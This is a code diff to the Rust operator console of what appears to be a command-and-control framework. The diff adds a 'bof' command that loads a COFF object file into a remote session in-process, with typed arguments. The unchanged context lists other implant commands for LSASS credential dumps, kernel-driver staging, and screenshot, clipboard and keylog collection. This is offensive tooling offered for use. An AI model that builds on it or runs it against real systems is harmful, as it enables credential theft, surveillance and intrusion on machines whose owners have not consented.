@@ -140,6 +140,9 @@ impl App {
                     "  cred <id> <user|kernel>                        LSASS dump (T032/T033; download the returned path)".into(),
                 );
                 self.push_log(
+                    "  bof <id> <local .obj> [int=42|str=hi ...]        COFF object in-process (T034)".into(),
+                );
+                self.push_log(
                     "  driver <id> load <svc> <src> <dst>   stage+start kernel driver (ABR-T013)"
                         .into(),
                 );
@@ -216,6 +219,22 @@ impl App {
                 // collect <id> <screenshot|clipboard|keylog>
                 let id: u32 = tokens[1].parse().unwrap_or(0);
                 Some(json!({ "cmd": "collect", "session": id, "action": tokens[2] }))
+            }
+            Some("bof") if tokens.len() >= 4 => {
+                // bof <id> <local .obj> [args as k=v pairs: int=42 str=hi]
+                let id: u32 = tokens[1].parse().unwrap_or(0);
+                let mut args = Vec::new();
+                for token in &tokens[3..] {
+                    if let Some((kind, value)) = token.split_once('=') {
+                        let kind = match kind {
+                            "int" => "int",
+                            "short" => "short",
+                            _ => "str",
+                        };
+                        args.push(json!({ "type": kind, "value": value }));
+                    }
+                }
+                Some(json!({ "cmd": "bof", "session": id, "source": tokens[2], "args": args }))
             }
             Some("cred") if tokens.len() >= 3 => {
                 // cred <id> <user|kernel> — LSASS dump; the result is a
